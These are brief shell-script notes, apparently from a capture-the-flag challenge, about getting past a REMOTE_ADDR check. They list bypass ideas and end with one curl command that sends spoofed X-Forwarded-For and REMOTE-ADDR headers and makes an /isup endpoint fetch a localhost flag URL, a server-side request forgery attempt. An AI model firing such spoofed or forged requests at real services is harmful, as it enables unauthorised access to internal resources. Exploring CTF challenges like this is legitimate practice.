# the problem is we need to fake the remote ip address and still get the
# response. The ip is checked via request.environ.get('REMOTE_ADDR')
# which is passed by WSGI, and probably alwas right:
# 
# Ideas:
#  1. have an IPv6 address that starts with 127 or 172
#  2. use the /isup endpoint itself to request a page from itself??
#  3. find some weird HTTP header to set it
#  4. ???
#  5. profit
curl -H 'X-Forwarded-For: 127.0.0.1' -H 'REMOTE-ADDR: 127.0.0.1' "http://108.61.211.185/isup?name=http:%2F%2F127.0.0.1%2Fflag%3Fkuchenblech"
